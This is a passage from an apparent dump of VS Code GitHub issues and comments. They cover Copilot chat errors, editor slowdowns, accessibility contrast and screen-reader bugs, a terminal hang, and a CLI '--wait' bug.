"vs-code-engineering[bot]", "body": "Thanks for creating this issue! We figured it's missing some basic information or in some other way doesn't follow our [issue reporting guidelines](https://aka.ms/vscodeissuereporting). Please take the time to review these and update the issue.\n\nFor Copilot Issues, be sure to visit our [Copilot-specific guidelines](https://github.com/microsoft/vscode/wiki/Copilot-Issues) page for details on the necessary information.\n\nHappy Coding!"}, {"author": "vs-code-engineering[bot]", "body": "Thanks for reporting this issue! Unfortunately, it's hard for us to understand what issue you're seeing. Please help us out by providing a screen recording showing exactly what isn't working as expected. While we can work with most standard formats, `.gif` files are preferred as they are displayed inline on GitHub. You may find https://gifcap.dev helpful as a browser-based gif recording tool.\n\nIf the issue depends on keyboard input, you can help us by enabling screencast mode for the recording (`Developer: Toggle Screencast Mode` in the command palette). Lastly, please attach this file via the GitHub web interface as emailed responses will strip files out from the issue.\n\nHappy coding!"}, {"author": "WilliamBerryiii", "body": "I am seeing similar behavior but only in WSL dev container attached VS Code instances, running on the host appears to be fine (for what possible reason I have NO clue). \n\nSet up: \n\n- No context attachments\n- The following prompt: \n\n```\nThe following is a log from running our test script in the browser console ... evaluate it and tell me why the nav/page_toc is not auto-scrolling, to keep the current active toc element in view of the page_toc container ...\n\n// Debug Output\n\nVM114:5 === Enhanced TOC Scroll Detection Debug ===\nVM114:14 TOC Container: <div class=\u200b\"page_toc\">\u200b\u2026\u200b</div>\u200bscroll\nVM114:15 TOC Container Rect: DOMRect {x: 1245.3333740234375, y: 93, width: 280, height: 370.3333435058594, top: 93, \u2026}\nVM114:16 TOC Container scrollTop: 0\nVM114:17 TOC Container scrollHeight: 1127\nVM114:18 TOC Container clientHeight: 369\nVM114:23 No active link found\ndebugTOCScrollDetailed @ VM114:23\n```\n\nWhat's also interesting is that the debug chat log is empty despite new chat windows, logging out and back into GHCP auth'ed account, window reloads, dev container rebuilds, and full system restarts. \n\nCurrent Build: \n\nVersion: 1.104.0-insider (user setup)\nCommit: a61e381bfa71c241738e48f2fc8b01eade94c91d\nDate: 2025-08-14T20:20:09.764Z\nElectron: 37.2.3\nElectronBuildId: 12035395\nChromium: 138.0.7204.100\nNode.js: 22.17.0\nV8: 13.8.500258-electron.0\nOS: Windows_NT x64 10.0.26100\n\nLet me know if there are deeper diagnostics I can pull. "}, {"author": "yashdubeyy", "body": "\n\ni am using vs code insiders, and this issue occurred (model Claude sonnet 3.7),\nextension details: \nVersion\n1.356.1735\nLast Updated\n2025-08-14, 22:18:19\nSize\n63.74MB\n\nI'm using windows 11.\nThe error \"Could not read image: invalid base64 image string\" typically occurs when there's a problem with an image that's being encoded or decoded using Base64 format."}, {"author": "WarrenSchultz", "body": "I suddenly started getting this issue in VSCode insiders today as well."}, {"author": "arkodeepsen", "body": "there is no image in my chat still getting this with WSL, wtf?\n"}, {"author": "RinineFV2", "body": "It's still happening, on messages WITHOUT IMAGES and even mid-operation!  \nThis is unbelievable, and on top of that, I'm wasting premium requests because of you.\n\n<img width=\"630\" height=\"186\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/2e5aabf3-49a3-4aca-8848-96546034e7b4\" />\n\n\nThe worst part is that there's still no way to continue the chat afterward, because all the following messages immediately give the same error.\nIt seems more than evident that the problem is that it tries to access in its context about previous messages to an image that vscode has decided to delete and the model tries to access images that no longer exist and besides errors are not controlled"}, {"author": "justschen", "body": "i wasn't able to repro, but i know what went wrong here and this should be fixed in the next copilot-chat pre-release (got merged late last night so didn't make the cut this morning, sorry). will update when it's out and would be great if folks could verify!\n\n>This is unbelievable, and on top of that, I'm wasting premium requests because of you.\n\nif this is urgent, you can switch to stable/release versions until the fix is in.\n\n>Could not read image: invalid base64 image string\n\nthis was a hardcoded error message we had in tokenization. we recenly swapped from base64 strings to URLs, and clearly urls are not base64 strings \ud83d\ude13 \n\n"}, {"author": "danyyy10", "body": "Same issue !!\n\nCould not read image: invalid base64 image string"}, {"author": "justschen", "body": "this should be fixed in the latest pre-release + insiders!"}, {"author": "neonvarun", "body": "<img width=\"487\" height=\"1018\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/36c21706-f0e2-43a6-bb6f-2369da37c60e\" />\n\nI am facing the same issue in insider preview."}, {"author": "justschen", "body": "could you check your copilot chat pre-release version? "}, {"author": "neonvarun", "body": "<img width=\"466\" height=\"365\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/80e744fd-e169-4ac0-907a-c1705f84bccb\" />\n\nThis is what I can see , \nI started a new chat and its working fine now, but the old models context is gone so a fresh start with the codebase."}, {"author": "japperJ", "body": "same issue here\n\n<img width=\"659\" height=\"380\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/7f953308-94a5-4175-8c8c-68f7f55f2795\" />"}, {"author": "justschen", "body": "looks like our copilot pre-release was never released yesterday, so the fix is actually not in yet. we're working on getting a new version out soon!"}, {"author": "el-nuru", "body": "> looks like our copilot pre-release was never released yesterday, so the fix is actually not in yet. we're working on getting a new version out soon!\n\nany idea on how soon?"}, {"author": "vs-code-engineering[bot]", "body": "This issue has been closed automatically because it needs more information and has not had recent activity. See also our [issue reporting](https://aka.ms/vscodeissuereporting) guidelines.\n\nHappy Coding!"}, {"author": "AlkineHotel", "body": "issue continues.  not fixed.  it occurs once context reaches a certain length regardless of whether any images have been used.  you do not need more context.  you have literally dozens of threads from people telling you about this bug all throughout github.  do you need help to fix this?  where's the triage?  i'll help"}, {"author": "justschen", "body": "we've seen zero reports of this same issue in the past 2 weeks ever since that pre-release build was released, sorry \ud83e\udd37\ud83c\udffb \n\nif you see any _recent_ issues like this, feel free to let us know!!!\n\nwe can ask for author verification of the issue as well to see if it's resolved :) "}, {"author": "TylerLeonhardt", "body": "Has anyone here tried the latest [VS Code Insiders](http://code.visualstudio.com/insiders/) and the Copilot Chat pre-release version? Can you confirm this is now working for you? (both of these were released earlier today, so double check you have latest)"}, {"author": "joaomoreno", "body": "> this should be fixed in the latest pre-release + insiders!\n\n@justschen Do you have verification steps?"}, {"author": "rzhao271", "body": "WSL LGTM.\n\nFeel free to comment on this issue if you are still seeing it on the latest VS Code Insiders and Copilot Chat pre-release."}]}
{"repo": "microsoft/vscode", "issue_number": 259566, "issue_url": "https://github.com/microsoft/vscode/issues/259566", "issue_title": "Capital casing in hovers", "issue_author": "bpasero", "issue_body": "<img width=\"182\" height=\"56\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/ea6150c6-a048-4d7c-b47c-356a84756b54\" />\n\nThe hover reads \"Restore to last checkpoint\"\n\nWe have rules for using upper case unless its short words like \"to\"\n\n//cc @ntrogh ", "issue_labels": ["bug", "verified"], "comments": []}
{"repo": "microsoft/vscode", "issue_number": 263003, "issue_url": "https://github.com/microsoft/vscode/issues/263003", "issue_title": "Switching editors gets very slow", "issue_author": "roblourens", "issue_body": "- Have a window open for awhile\n- After a time, things like switching editor tabs with the keyboard gets very sluggish\n\nThis trace shows it taking 100ms+\n\n[Trace-20250822T162808.json.zip](https://github.com/user-attachments/files/21946057/Trace-20250822T162808.json.zip)\n\n<img width=\"889\" height=\"899\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/4038d517-a650-4abb-b73f-4b6b95783158\" />\n\n\nIt seems like the problem is the treeview calling `getEntireMenuContexts` many times. I added a logpoint and switched editors once, it's being called for `copilot-chat` and `gitlens.views.fileHistory` 1000s of times and seems expensive\n[vscode-app-1755905442804.log](https://github.com/user-attachments/files/21946087/vscode-app-1755905442804.log)\n\nand then the EH crashed while running this logpoint so I couldn't investigate the broken state more.\n\n<img width=\"445\" height=\"303\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/1961e3a3-9d24-4a5d-b162-eb7307a6420e\" />\n\nafter reloading the window, it takes around 10ms to switch editors\n\ncc @bpasero in case you know anything about this", "issue_labels": ["bug", "verified", "freeze-slow-crash-leak", "author-verification-requested"], "comments": [{"author": "bpasero", "body": "I do not know anything about this, nor did I experience it. Lets wait for @alexr00 to chime in what this method does."}, {"author": "alexr00", "body": "I also haven't seen this.\n\nIt is used to get all the context keys that the menu cares about. We have it so that we can tell if the contexts on a tree item have changed and we need to update the inline actions, which is a menu."}, {"author": "roblourens", "body": "Is it possible that it's called for every item in the tree, not just ones that are rendered? If you don't usually have the Copilot Debug View open, maybe try leaving it open for awhile. The NES requests are most of the rows.\n\nI've been hunting this for awhile, it's definitely not new"}, {"author": "alexr00", "body": "Even though I can't repro, there's a really simple change I can try."}, {"author": "alexr00", "body": "@roblourens would you be able to verify this?"}, {"author": "roblourens", "body": "Good call, I think that helped. I will optimistically mark as verified and watch out for it, thanks!"}]}
{"repo": "microsoft/vscode", "issue_number": 262539, "issue_url": "https://github.com/microsoft/vscode/issues/262539", "issue_title": "Chat participants fail with error when not signed in", "issue_author": "alexr00", "issue_body": "1. Log out of GitHub in VS Code\n2. Reload\n3. Open chat and send a request that is `@` a participant.\n4. It should prompt for sign in, but instead it just doesn't work in one of several ways:\nError:\n\n<img width=\"1038\" height=\"619\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/2056de41-8661-4b38-9fd8-0240316ca301\" />\n\nStuck (participant never gets called):\n\n<img width=\"1049\" height=\"534\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/9cc71fd2-b8b4-4b4f-a96e-1a0dee0edd38\" />", "issue_labels": ["bug", "verified", "confirmed", "workbench-copilot", "plg"], "comments": [{"author": "wiggzz", "body": "I am also seeing this - can reproduce with https://github.com/microsoft/vscode-extension-samples/tree/main/chat-sample"}, {"author": "roblourens", "body": "@bpasero are we expecting to handle this scenario?"}, {"author": "bpasero", "body": "@bhavyaus can you help me understand how this should work for `@vscode`, my understanding is that you register an agent, but somehow only when the extension is not installed?\n\nhttps://github.com/microsoft/vscode/blob/715d6f3d6bed29f0fa17ab321773ae55f7fd4886/src/vs/workbench/contrib/chat/browser/chatSetup.ts#L861-L866\n\nEven if I comment out these lines, it somehow still does not work, i.e. does not forward to the agent.\n\nI think if we want to fully support this we would have to register every agent that the extension comes with.... sounds like a hack to me because when the extension is there, could it maybe by itself trigger the sign in and forward to the agents?"}, {"author": "bpasero", "body": "OK, a bit more digging into this, the `@xy` use seems to bypass our built-in agent registrations, i.e. when picking `@terminal` there is an explicit request to ask for `github.copilot.terminalPanel` agent. So it does not seem sufficient to just register an agent of id `terminal` here:\n\nhttps://github.com/microsoft/vscode/blob/d0ed1e6328bd52c486aba28f03d83c201eae24af/src/vs/workbench/contrib/chat/browser/chatSetup.ts#L153-L155"}, {"author": "bhavyaus", "body": "This is happening because we explicitly prevent these chatParticipants(`@vscode`, `@workspace` and `@terminal` from being shown when the chat extension is installed.\n\nhttps://github.com/microsoft/vscode/blob/1b80a2f9226e48e659938f167722f97dd740c1ed/src/vs/workbench/contrib/chat/browser/chatSetup.ts#L885\n\nThis is to prevent chatParticipant of the same name from showing up twice because we did not have a `when` condition setup for the chatParticipant registration.\n\nThat should be fixed with: https://github.com/microsoft/vscode-copilot-chat/pull/822\n\nAlso updated the conditions to now show the builtin chatParticipants when notInstalled/notSignedIn: https://github.com/microsoft/vscode/pull/263942\n"}, {"author": "bpasero", "body": "Hm, I still got an error/warning, but maybe that was something else, thanks for verifying."}]}
{"repo": "microsoft/vscode", "issue_number": 263926, "issue_url": "https://github.com/microsoft/vscode/issues/263926", "issue_title": "Window hangs when prompting to continue waiting for terminal", "issue_author": "roblourens", "issue_body": "Reported by Simon originally but I can repro\n\n<img width=\"2245\" height=\"1274\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/de36292c-3145-42a3-bbad-06db197ac456\" />\n\nFirst I made this modification hoping to be able to trigger it faster\n\n<img width=\"495\" height=\"238\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/88c67ded-039c-47f0-aa12-6510581c5dbe\" />\n\nThen \"run top in a bg terminal\"\n\nWait a bit, then it hangs.\n\nFirst, I don't understand what we are waiting for the background terminal for. Isn't the point that you are expecting it to run in the background, so why would you ask me whether to \"keep waiting\" for it?\n\nThen, we are stuck in an infinite while loop that has no way to exit when `state == 'Prompting'`. Please be very careful with while loops.\n\n<img width=\"1840\" height=\"1150\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/ea0d850f-92ba-4828-8e33-1d6a7e9da64c\" />", "issue_labels": ["bug", "verified", "insiders-released", "chat-terminal"], "comments": [{"author": "meganrogge", "body": "> First, I don't understand what we are waiting for the background terminal for. Isn't the point that you are expecting it to run in the background, so why would you ask me whether to \"keep waiting\" for it?\n\nWe are polling until the terminal becomes idle"}]}
{"repo": "microsoft/vscode", "issue_number": 270664, "issue_url": "https://github.com/microsoft/vscode/issues/270664", "issue_title": "Don't require agent mode to set default model experiment", "issue_author": "roblourens", "issue_body": "Need to port this to a 1.105 release https://github.com/microsoft/vscode/pull/270620", "issue_labels": ["bug", "candidate", "chat"], "comments": []}
{"repo": "microsoft/vscode", "issue_number": 255443, "issue_url": "https://github.com/microsoft/vscode/issues/255443", "issue_title": "filter webview editors out of 'add context'", "issue_author": "eleanorjboyd", "issue_body": "Steps to Reproduce:\n\n1. open a PR view\n2. go to the attach menu, try and select the PR, get an errored attachment\n\nhttps://github.com/user-attachments/assets/f49919e8-7371-40f3-a827-8651af2e7b84", "issue_labels": ["bug", "unreleased", "chat"], "comments": [{"author": "alexr00", "body": "@roblourens and @mjbvz is there something extensions with webviews should be doing here, or is this not supported?"}, {"author": "roblourens", "body": "Is this just attached as a file or are you doing something special already? It wouldn't work as a file but I'm not sure why it didn't get filtered out of the attach picker, thought we did that"}, {"author": "eleanorjboyd", "body": "I didn't do anything special just opened the PR view. idk if you were asking me or alex"}, {"author": "alexr00", "body": "@roblourens it's just listed in the picker when you click the \"Add Context\" button in the Chat input."}]}
{"repo": "microsoft/vscode", "issue_number": 269274, "issue_url": "https://github.com/microsoft/vscode/issues/269274", "issue_title": "In Dark theme, the contrast ratio of pink color text in the editor section is 2.482:1, which is below the required minimum of 4.5:1.: A11y_Visual Studio Code Copilot Extensions_Editor Section_No Disruption of Accessibility Features", "issue_author": "kupatkar99", "issue_body": "### GitHub Tags:\n#A11yTCS; #A11ySev2; #DesktopApp; #Win32; #A11yMAS; #SH-Visual Studio Code Copilot Extensions-Win32-Sept25;#Visual Studio Code Client;#WCAG4.3.1; #No Disruption of Accessibility Features;\n\n### Environment Details:\nApplication Name: Visual Studio Code Copilot Extensions\nVisual studio code Version: 1.104.2 (user setup)\nMicrosoft Windows 11 Enterprise 24H2 Build 26100.6584\n\n### Repro Steps:\n\n1. Turn on VS Code dark theme.\n2. Open Visual studio Code.\n3. Login to GitHub copilot chat.\n4. Tab till github copilot chat section.\n5. Tab till code editor section and press \"Ctrl+i\" inline copilot chat will get open.\n6. Enter the prompt and send it.\n7. Solution will appear in editor section.\n8. Observe that In Dark theme, the contrast ratio of pink color text in the editor section is greater than or equal to 4.5:1 or not.\n\n### Actual Result:\nIn Dark theme, the contrast ratio of pink text in the editor section is 2.482:1, which is below the required minimum of 4.5:1.\n\n### Expected Result:\nIn Dark theme, the contrast ratio of pink text in the editor section with respect to its background should be greater than or equal to required 4.5:1.\n\n### User Impact:\nlow vision and visually impaired users will face difficulty in viewing the text if the color contrast ratio of text is less than required 4.5:1 with respect to its background\n\n### Attachment:\n\n<img width=\"1361\" height=\"692\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/0b1979cb-22cd-48fe-9a72-713793251738\" />", "issue_labels": ["bug", "themes", "accessibility-sla"], "comments": [{"author": "meganrogge", "body": "We should meet at least 3 for this case - as it's not normal text, it is being used in a UI component. "}, {"author": "meganrogge", "body": "Low vision and visually impaired users can make use of our high contrast themes if they need 4.5 contrast for this component. "}, {"author": "jo-oikawa", "body": "Bumping up the pink to #CE92A4 would get us to 3:1 contrast"}, {"author": "mrleemurray", "body": "@jo-oikawa @meganrogge just to confirm, is 3.62 : 1 acceptable?\n\n<img width=\"635\" height=\"352\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/4120591f-1a56-4d67-baf0-c3cf56dcb41d\" />"}, {"author": "mrleemurray", "body": "Double checked with another tool eyedropping the colors & still above 3:1\n\n<img width=\"721\" height=\"448\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/ab1edbf5-0d54-4257-ba08-df6b9bc7911e\" />"}, {"author": "meganrogge", "body": "Yes, that's what I believe we should do here. @kupatkar99 please confirm you understand and agree with my evaluation here - that 3:1 is reasonable."}, {"author": "kupatkar99", "body": "Hi @meganrogge According to the High Contrast MAS rule, text with insufficient contrast against its background can be difficult or even impossible to read. To comply with MAS 1.4.3, the color contrast ratio should be at least 4.5:1."}, {"author": "isidorn", "body": "The Visual Studio and VS Code team have an agreement with the Accessibility team that 3:1 contrast is enough for things inside the editor."}, {"author": "mrleemurray", "body": "Addressed in https://github.com/microsoft/vscode/pull/270406"}, {"author": "RedCMD", "body": "I don't like this\n\n`keyword.control` went from a deep purple to a pale pink\n\n<img width=\"762\" height=\"484\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/106c329e-847b-4ab4-a0fa-ae80aab6c8d9\" />\n\n<img width=\"760\" height=\"485\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/88da3396-74a4-4c0a-aa2e-f828f03ba249\" />\n\nthe contrast ratio was already at `5.92` why are we complaining that its not above 3?"}, {"author": "meganrogge", "body": "@mrleemurray I had assumed we'd only apply this when the background is that diff/green color. Is there a way to do that so the color isn't changed against the standard background?"}, {"author": "mrleemurray", "body": "@alexdima @aeschli do you know if conditional rendering is possible in text mate?"}]}
{"repo": "microsoft/vscode", "issue_number": 266687, "issue_url": "https://github.com/microsoft/vscode/issues/266687", "issue_title": "\"Selected Model\" and \"Model multiplier\" information associate with copilot response is not accessible with screen reader: A11y_Visual Studio Code_Github_Copilot_Screen reader", "issue_author": "kapilvaishna", "issue_body": "**Please do not close this bug. This bug should only be closed by Trusted Tester after verification.**\n\"[Check out Accessibility Insights!](https://nam06.safelinks.protection.outlook.com/?url=https://accessibilityinsights.io/&data=02%7c01%7cv-stfe%40microsoft.com%7cb67b2c4b646d4f9561a208d6f4b5c39b%7c72f988bf86f141af91ab2d7cd011db47%7c1%7c0%7c636965458850501301&sdata=mxhokIKNMb22llsjXHLgU3XZibj1Qfx37rpY4PU2sfE%3D&reserved=0) - Identify accessibility bugs before check-in and make bug fixing faster and easier.\"\n\n## GitHub Tags\n#A11yeDAD; #A11yMAS; #A11yTCS; #Win32; #A11ySev2;#DesktopApp; #Visual Studio Code Client; #BM-VisualStudioCodeClient-Win32-Jan2024; #WCAG1.3.1; #FTP; #Screen Reader; #JAWS; #Element:chatboard; #STP; #NVDA; #Closed; #A11yFixed;\n\n## Environment Details:\nApplication: VS Code\nVisual studio code version: 1.103.2\nOS: Windows 11 Enterprise 24H2\nBuild: 26100.2605\nScreen reader\nJAWS version: 2025.2504.89\nNVDA: 2024.4.2\n\n## Repro Steps\n\n1. Turn on Jaws/NVDA screen reader\n2. Open Visual Studio Code \n3. Ensure GitHub Copilot is installed and signed in.\n4. TAB till \"Select model\" and press ENTER key.\n5. Select a model and given some prompt in GitHub copilot chat input and press ENTER key.\n6. Repeat this previews step by selecting different model.\n7. TAB till Copilot response\n8. Observer the issue\n\n## Actual Experience.\nWhen there are multiple copilot responses in the chat for different selected models, the \"Selected Model\" and \"Model model multiplier\" information appears at the bottom right corner of each response. However, this information is not accessible with a screen reader when navigating through that specific response.\n\n## Expected Experience\nThe \"Selected Model\" and \"Model model multiplier\" information, which is displayed in the bottom right corner of each copilot response, should be accessible to screen readers when navigating through the copilot response.\n\n## User Impact:\nWhen there are multiple responses for different selected models, it can be challenging for screen reader users to identify which model is associated with each response.\n\n## Attachment\nNVDA\n\nhttps://github.com/user-attachments/assets/a708fc96-c4b5-4813-8c35-3dacb5b472c7\n\n\nJAWS\n\nhttps://github.com/user-attachments/assets/9a8a122c-b3d7-4769-9628-4a429959a23c", "issue_labels": ["bug", "verified", "accessibility", "insiders-released"], "comments": [{"author": "meganrogge", "body": "Pls update to insider's, where we no longer visually surface this information. \n\n\n<img width=\"803\" height=\"359\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/c2ec788b-f4d3-4157-9b2d-67e1ba43e996\" />"}, {"author": "meganrogge", "body": "Weird, these weren't showing up for me in insider's, but I see them in oss. This should be a part of the aria label"}, {"author": "kapilvaishna", "body": "@meganrogge In below environment, still showing the \"Selected Model\" and \"Mode Multiplier\" information for me. Could you please confirm how this issue fixed, information is removed or now it getting announce by screen reader.\n\nVS code insider (1.105.0)\n\n<img width=\"1366\" height=\"768\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/1419883d-2fa4-4bc7-8b3f-86bb25553cff\" />\n\nNot announced by  screen reader\n\n<img width=\"1366\" height=\"768\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/55086864-d19a-430e-b91b-2598adca566b\" />"}, {"author": "meganrogge", "body": "You can now move focus to that via keyboard and the info is read \n\nhttps://github.com/user-attachments/assets/725b805d-7715-4369-b387-5b0be77cea14"}, {"author": "kapilvaishna", "body": "@meganrogge I was checking with JAWS and NVDA but when focus move to that information it announces as 'note' for below version\n\nVS code insider (1.105.0)\n\nNVDA 2025.3\n\n<img width=\"1365\" height=\"712\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/fb38b17b-29d7-4ce3-bea3-03eb609cecff\" />\n\n\nJAWS 2025\n\nhttps://github.com/user-attachments/assets/2eef6123-121c-4272-84c9-afeb653d900a"}, {"author": "kapilvaishna", "body": "@meganrogge Could you please provide an ETA for when this fix will be available in insider to  verify. "}, {"author": "meganrogge", "body": "You'll see a label of `insiders-released` when it's available. Sometime next week. "}, {"author": "kapilvaishna", "body": "Issue is not repro in VS code insider 1.106.0\n\nhttps://github.com/user-attachments/assets/79d932cd-f293-4f0f-a6fd-aefb54807cd8"}]}
{"repo": "microsoft/vscode", "issue_number": 269853, "issue_url": "https://github.com/microsoft/vscode/issues/269853", "issue_title": "Incorrectly reported as NES, not completions", "issue_author": "ulugbekna", "issue_body": "\nType: <b>Bug</b>\n\n# Description\n\n<img width=\"3024\" height=\"1964\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/4de0024a-5b6d-495f-942a-49f1203d7682\" />\n\n```\nINFO InlineCompletions.fetch @@ {\"kind\":\"end\",\"requestId\":66,\"durationMs\":6,\"result\":[{\"range\":\"[23,13 -> 23,13]\",\"text\":\"{\\n\\t\\tstart: string;\\n\\t\\tend: string;\\n\\t};\",\"isInlineEdit\":true,\"source\":\"nes\"}],\"time\":1759595966622,\"didAllProvidersReturn\":true}\n```\n\nVS Code version: Code - Insiders 1.105.0-insider (72f7c60cfcc01d4e8a437f4a1704b8bbd3229411, 2025-10-03T20:13:56.017Z)\nOS version: Darwin arm64 24.6.0\nModes:\n\n<details>\n<summary>System Info</summary>\n\n|Item|Value|\n|---|---|\n|CPUs|Apple M1 Pro (8 x 2400)|\n|GPU Status|2d_canvas: enabled<br>direct_rendering_display_compositor: disabled_off_ok<br>gpu_compositing: enabled<br>multiple_raster_threads: enabled_on<br>opengl: enabled_on<br>rasterization: enabled<br>raw_draw: disabled_off_ok<br>skia_graphite: enabled_on<br>trees_in_viz: disabled_off<br>video_decode: enabled<br>video_encode: enabled<br>webgl: enabled<br>webgl2: enabled<br>webgpu: enabled<br>webnn: disabled_off|\n|Load (avg)|14, 11, 29|\n|Memory (System)|32.00GB (0.13GB free)|\n|Process Argv|--log info --log github.vscode-pull-request-github=debug --log github.copilot-chat=trace --crash-reporter-id 3184aec0-4b31-4764-bfb0-162155975430|\n|Screen Reader|no|\n|VM|0%|\n</details><details><summary>Extensions (78)</summary>\n\nExtension|Author (truncated)|Version\n---|---|---\nBookmarks|ale|13.5.0\ntsl-problem-matcher|amo|0.6.2\nmarkdown-mermaid|bie|1.29.0\ncerebras-chat|Cer|0.1.13\nnpm-intellisense|chr|1.4.5\nesbuild-problem-matchers|con|0.0.3\nvscode-eslint|dba|3.0.16\nkusto|don|0.5.4\ntypescript-notebook|don|2.0.6\ngitlens|eam|2025.10.405\nEditorConfig|Edi|0.17.4\nprettier-vscode|esb|11.0.0\ncodespaces|Git|1.17.4\ncopilot|Git|1.376.1794\ncopilot-chat|Git|0.32.2025100302\nremotehub|Git|0.65.2025081801\nvscode-pull-request-github|Git|0.119.2025100204\ngo|gol|0.50.0\ngc-excelviewer|Gra|4.2.64\nvscode-drawio|hed|1.9.250226013\nvscode-postfix-ts|ipa|1.13.2\nlldb-dap|llv|0.2.18\nmdl-ext|you|0.0.1\nrainbow-csv|mec|3.23.0\ntemplate-string-converter|meg|0.6.1\nvscode-azureresourcegroups|ms-|0.11.4\nvscode-containers|ms-|2.2.0\nvscode-docker|ms-|2.0.0\ndebugpy|ms-|2025.15.2025100201\npython|ms-|2025.17.2025100201\nvscode-pylance|ms-|2025.8.3\nvscode-python-envs|ms-|1.11.12751009\njupyter|ms-|2025.9.2025092201\njupyter-keymap|ms-|1.1.2\njupyter-renderers|ms-|1.3.2025062701\nvscode-jupyter-cell-tags|ms-|0.1.9\nvscode-jupyter-slideshow|ms-|0.1.6\nremote-ssh|ms-|0.121.2025093015\nremote-ssh-edit|ms-|0.87.0\nremote-wsl|ms-|0.104.3\nazure-repos|ms-|0.41.2025081801\ncpptools|ms-|1.27.7\ndebug-value-editor|ms-|0.2.2\nhexeditor|ms-|1.11.1\njs-debug-nightly|ms-|2025.10.117\nremote-explorer|ms-|0.6.2025081809\nremote-repositories|ms-|0.43.2025081801\nremote-server|ms-|1.6.2025091709\nsimulation-test-runner|ms-|0.0.4\ntest-adapter-converter|ms-|0.2.1\nts-file-path-support|ms-|1.0.0\nvscode-diagnostic-tools|ms-|1.2.0\nvscode-github-issue-notebooks|ms-|0.0.133\nvscode-js-profile-flame|ms-|1.0.9\nvscode-speech|ms-|0.16.0\nvscode-typescript-next|ms-|6.0.20251003\nwasm-dwarf-debugging|ms-|1.0.1\nweb-editors|ms-|0.3.0\nocaml-platform|oca|1.32.3\nrefactor|p42|3.0.1\ndeoptexplorer-vscode|rbu|1.1.2\ntoggle|reb|0.0.2\nvscode-xml|red|0.29.2025081108\nvscode-yaml|red|1.19.0\nLiveServer|rit|5.7.9\nrust-analyzer|rus|0.3.2593\nsvg-preview|Sim|2.8.3\nswift-vscode|swi|2.11.20250806\ngraphviz-interactive-preview|tin|0.3.5\ntldraw-vscode|tld|2.128.0\nnative-preview|Typ|0.20251004.1\njson-string-viewer|Ulu|0.0.3\nexplorer|vit|1.30.0\nerrorlens|use|3.26.0\nvim|vsc|1.30.1\nvscode-alternate-file|wil|0.3.1\npretty-ts-errors|Yoa|0.6.1\nmarkdown-all-in-one|yzh|3.6.3\n\n\n</details><details>\n<summary>A/B Experiments</summary>\n\n```\nvsliv368:30146709\npythonvspyt551cf:31249598\nvscrp:30624060\nnativeloc1:31118317\ndwcopilot:31158714\ndwoutputs:31242946\ncopilot_t_ci:31333650\ng012b348:31231168\n6gi0g917:31259950\npythonrdcb7:31268811\nusemplatestapi:31297334\n6518g693:31302842\n0g1h6703:31329154\ncs4_fixed:31391938\n6abeh943:31336334\nenvsactivate1:31349248\neditstats-enabled:31346256\naa_c:31379597\ncloudbuttont:31366566\ntodos-1:31366868\nv66_all_req:31396048\nmultireplacestring:31382717\nnb255704_tf:31377673\n3efgi100_wstrepl:31382709\nnes-auto-10:31394064\nae882133:31390472\ntrigger-command-fix:31379601\nchat-sessions-view-c:31392542\nauto_model_enabled:31396818\nnode-fetch:31395554\ngrok-control-prompt:31384642\nuse-responses-api:31390341\nc91a3477:31396429\n\n```\n\n</details>\n\n<!-- generated by issue reporter -->", "issue_labels": ["bug", "info-needed", "NES", "NES-extension"], "comments": [{"author": "hediet", "body": "Can you share the UI repro?"}, {"author": "ulugbekna", "body": "I don't have it anymore :( "}]}
{"repo": "microsoft/vscode", "issue_number": 266016, "issue_url": "https://github.com/microsoft/vscode/issues/266016", "issue_title": "Same session shows twice in the Chat Sessions view", "issue_author": "alexr00", "issue_body": "1. Kick off a session using the Chat view\n2. See the Chat editor open and the session log start streaming in. \n3. The Session shows twice in the Chat Sessions view:\n(It's the first two lines there. The other ones are different, despite having the same name)\n<img width=\"1055\" height=\"309\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/aac8b053-49b3-4494-9430-96f3845465c8\" />", "issue_labels": ["bug"], "comments": [{"author": "osortega", "body": "Fixed in latest version"}, {"author": "alexr00", "body": "Adding labels and milestones so this gets verified."}]}
{"repo": "microsoft/vscode", "issue_number": 269502, "issue_url": "https://github.com/microsoft/vscode/issues/269502", "issue_title": "`code --wait -r some-file-in-another-directory` does not wait if vscode opens the file in a new window", "issue_author": "aconradi", "issue_body": "\nType: <b>Bug</b>\n\nWhen I open a file with `code --wait -r` that is in another directory than what is open in vscode and where vscode decides to open a new window the `code --wait` command returns immediately. I expected it to wait for me to be done editing the file and closing it.\n\n1. Open a directory in VSCode\n2. Open a terminal in the new VSCode window\n3. Run `code --wait -r C:\\temp\\some-file` in that terminal\n4. Watch as VSCode opens a new window and then the `code` commands returns immediately, without waiting for the new editor window to be done with the file.\n\n\nVS Code version: Code 1.96.4 (cd4ee3b1c348a13bafd8f9ad8060705f6d4b9cba, 2025-01-16T00:16:19.038Z)\nOS version: Windows_NT x64 10.0.22631\nModes:\nConnection to 'ssh-remote+gklab-ssc-lrs03.igk.intel.com' could not be established\nConnection to 'ssh-remote+lrs03' could not be established\nConnection to 'ssh-remote+lrs03' could not be established\n\n<details>\n<summary>System Info</summary>\n\n|Item|Value|\n|---|---|\n|CPUs|12th Gen Intel(R) Core(TM) i7-1265U (12 x 2688)|\n|GPU Status|2d_canvas: enabled<br>canvas_oop_rasterization: enabled_on<br>direct_rendering_display_compositor: disabled_off_ok<br>gpu_compositing: enabled<br>multiple_raster_threads: enabled_on<br>opengl: enabled_on<br>rasterization: 